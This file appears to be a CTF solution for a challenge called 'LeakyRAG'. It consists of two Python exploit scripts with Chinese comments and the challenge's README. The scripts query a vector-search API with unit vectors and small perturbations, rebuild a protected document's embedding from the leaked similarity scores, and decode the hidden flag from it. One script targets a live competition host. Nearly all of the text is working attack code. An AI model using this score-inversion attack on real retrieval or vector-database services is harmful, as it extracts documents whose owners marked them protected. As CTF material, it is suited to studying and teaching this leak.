#!/usr/bin/env python3
"""
LeakyRAG CTF Exploit — 通过分数泄漏重建向量并解码 flag
"""
import requests
import numpy as np
import sys

BASE_URL = "https://f4prjjcr-cn5q-ahhq-2nnd-6a5b690731865-neptunus.nepctf.com"  # 根据实际情况修改
DIM = 64
DELTA = 0.1  # 差分步长


def search(vector: list, top_k: int = 20) -> list:
    """调用 /api/search，返回结果列表"""
    resp = requests.post(
        f"{BASE_URL}/api/search",
        json={"vector": vector, "top_k": top_k},
        timeout=10,
    )
    return resp.json()["results"]


def get_flag_score(results: list) -> float | None:
    """从结果中提取 flag_doc 的分数"""
    for r in results:
        if r["doc_id"] == "flag_doc":
            return r["score"]
    return None


def decode(v_norm: np.ndarray) -> str:
    """从归一化向量恢复文本（与服务器同逻辑）"""
    v = np.array(v_norm, dtype=np.float64)
    v = v / np.linalg.norm(v)
    ref = v[-1]
    chars = []
    for i in range(DIM - 1):
        ratio = v[i] / ref
        char_code = int(round(np.log(ratio) * 64 + 128))
        if 32 <= char_code <= 126:
            chars.append(chr(char_code))
        else:
            break
    return "".join(chars)


def main():
    recovered = np.zeros(DIM, dtype=np.float64)
    missing = []  # 未能直接恢复的维度

    # ============================================================
    # 阶段 1：单位向量探测
    # ============================================================
    print("[*] Phase 1: probing with unit vectors...")
    for i in range(DIM):
        found = False

        # 尝试正单位向量
        q = np.zeros(DIM, dtype=np.float64)
        q[i] = 1.0
        results = search(q.tolist(), top_k=20)
        score = get_flag_score(results)
        if score is not None:
            recovered[i] = score
            found = True
            print(f"  [+] dim {i:2d}: +e → {score:+.6f}")

        # 尝试负单位向量
        if not found:
            q[i] = -1.0
            results = search(q.tolist(), top_k=20)
            score = get_flag_score(results)
            if score is not None:
                recovered[i] = -score  # dot(-e_i, v) = -v[i]
                found = True
                print(f"  [+] dim {i:2d}: -e → {score:+.6f} → v={-score:+.6f}")

        if not found:
            missing.append(i)
            print(f"  [-] dim {i:2d}: flag_doc not in top 20")

    print(f"\n[*] Recovered: {DIM - len(missing)}/{DIM}, Missing: {len(missing)}")

    # ============================================================
    # 阶段 2：差分恢复缺失维度
    # ============================================================
    if missing:
        print(f"\n[*] Phase 2: differential recovery for missing dims: {missing}")

        # 构造部分向量 p（已知分量=恢复值，未知分量=0）
        p = recovered.copy()
        p_norm = np.linalg.norm(p)

        # 基准查询
        results_base = search(p.tolist(), top_k=20)
        score_base = get_flag_score(results_base)
        if score_base is None:
            print("[!] Error: flag_doc not found in baseline query. Try increasing top_k or check server.")
            sys.exit(1)
        print(f"  [*] Baseline score (partial vector): {score_base:.6f}")

        for j in missing:
            # 查询 p + δ·e_j
            q_j = p.copy()
            q_j[j] += DELTA
            q_j_norm = np.linalg.norm(q_j)

            results_j = search(q_j.tolist(), top_k=20)
            score_j = get_flag_score(results_j)
            if score_j is None:
                print(f"  [!] dim {j}: flag_doc not found with perturbation, skipping")
                continue

            # 精确公式: v[j] = (score_j * ||p+δe_j|| - score_base * ||p||) / δ
            v_j = (score_j * q_j_norm - score_base * p_norm) / DELTA
            recovered[j] = v_j
            print(f"  [+] dim {j:2d}: recovered = {v_j:+.6f}")

    # ============================================================
    # 阶段 3：解码
    # ============================================================
    print(f"\n[*] Phase 3: decoding...")
    print(f"  Recovered vector norm: {np.linalg.norm(recovered):.6f}")
    flag = decode(recovered)
    print(f"\n{'='*50}")
    print(f"  FLAG: {flag}")
    print(f"{'='*50}")

    # 验证：用恢复的向量再次查询，应该得到接近 1.0 的分数
    results_verify = search(recovered.tolist(), top_k=5)
    for r in results_verify:
        if r["doc_id"] == "flag_doc":
            print(f"  Verification score: {r['score']:.10f} (should be ≈ 1.0)")
            break


if __name__ == "__main__":
    main()

'''
#!/usr/bin/env python3
"""
LeakyRAG CTF — Exploit
即使文档被标记为 protected，搜索分数依然泄露
"""
import requests
import numpy as np
import sys

BASE_URL = "http://localhost:9084"
DIM = 64

def search(vector, top_k=100):
    """调用 /api/search 接口"""
    try:
        resp = requests.post(
            f"{BASE_URL}/api/search",
            json={"vector": vector, "top_k": top_k},
            timeout=10
        )
        return resp.json()
    except Exception as e:
        print(f"[!] 请求失败: {e}")
        return None

def get_flag_score(vec):
    """提取 flag_doc 的得分"""
    results = search(vec.tolist(), top_k=100)
    if results is None or "results" not in results:
        raise RuntimeError(f"搜索接口异常: {results}")
    
    for r in results["results"]:
        if r["doc_id"] == "flag_doc":
            print(f"    找到 flag_doc: score={r['score']:.6f}, snippet={r['snippet']}")
            return r["score"]
    
    raise RuntimeError("flag_doc not found in results")

def decode(v_norm: np.ndarray) -> str:
    """从归一化向量恢复文本"""
    v = np.array(v_norm, dtype=np.float64)
    v = v / np.linalg.norm(v)
    ref = v[-1]
    chars = []
    for i in range(DIM - 1):
        if ref == 0:
            break
        ratio = v[i] / ref
        if ratio <= 0:
            break
        char_code = int(round(np.log(ratio) * 64 + 128))
        if 32 <= char_code <= 126:
            chars.append(chr(char_code))
        else:
            break
    return ''.join(chars)

def main():
    print("[*] LeakyRAG 攻击 — 利用分数泄露重建向量")
    print(f"[*] 目标: {BASE_URL}")
    
    # 检查服务
    try:
        stats = requests.get(f"{BASE_URL}/api/stats", timeout=5).json()
        print(f"[*] 服务状态: {stats}")
    except Exception as e:
        print(f"[!] 无法连接: {e}")
        sys.exit(1)
    
    recovered_vec = np.zeros(DIM, dtype=np.float64)
    
    print("\n[*] 逐维探测 flag 向量 (64维)...")
    
    for i in range(DIM):
        # 正向查询
        q_pos = np.zeros(DIM)
        q_pos[i] = 1.0
        s_pos = get_flag_score(q_pos)
        
        # 负向查询
        q_neg = np.zeros(DIM)
        q_neg[i] = -1.0
        s_neg = get_flag_score(q_neg)
        
        # 取平均消除误差
        val = (s_pos - s_neg) / 2.0
        recovered_vec[i] = val
        
        if i % 10 == 0 or i == DIM - 1:
            print(f"  维度 {i:2d}/{DIM}: val={val:.6f}")
    
    print("\n[+] 向量重建完成")
    print(f"[*] 范数: {np.linalg.norm(recovered_vec):.6f}")
    
    # 解码
    flag = decode(recovered_vec)
    if flag:
        print(f"\n[FLAG] {flag}")
    else:
        # 如果直接解码失败，尝试微调
        print("[!] 直接解码失败，尝试微调...")
        v = recovered_vec / np.linalg.norm(recovered_vec)
        ref = v[-1]
        chars = []
        for i in range(DIM - 1):
            ratio = v[i] / ref
            if ratio <= 0:
                break
            for delta in [0, -1, 1, -2, 2]:
                char_code = int(round(np.log(ratio) * 64 + 128)) + delta
                if 32 <= char_code <= 126:
                    chars.append(chr(char_code))
                    break
            else:
                break
        flag = ''.join(chars)
        print(f"[FLAG] {flag}")

if __name__ == "__main__":
    main()


# LeakyRAG — SecureRAG 向量搜索引擎

欢迎来到 SecureRAG，我们最新的"可搜索加密"向量数据库产品。

## 产品特性

- **加密搜索**：文档上传后立即加密，只有向量索引参与搜索
- **智能保护**：敏感文档标记为 `[PROTECTED by SecureAI]`，内容不可读取
- **高性能**：基于余弦相似度的快速向量检索，支持 top-k 查询
- **开放 API**：上传、搜索、查询文档状态

## 快速启动

```bash
docker-compose up -d --build
```

服务运行在 `http://localhost:9084`

## API 文档

### `POST /api/search` — 向量搜索
```json
{
  "vector": [0.1, 0.2, ..., 0.1],   // 64 维浮点向量
  "top_k": 5                          // 返回 top-k 结果
}
```
返回每个匹配文档的 `doc_id`、`score`（余弦相似度 float64）、`snippet`。

### `POST /api/upload` — 上传文档
```json
{
  "text": "your document text here"
}
```
上传后立即索引，可通过搜索查询。

### `GET /api/doc/<doc_id>` — 读取文档
普通文档返回全文。受保护文档（如 flag）返回 403。

### `GET /api/stats` — 服务状态
返回文档总数和向量维度。

## 安全声明

我们的"可搜索加密"方案保证：
- flag 文档内容不可直接读取
- flag 文档向量不可获取
- 搜索过程不泄露文档内容

**你能证明我们错了吗？**


'''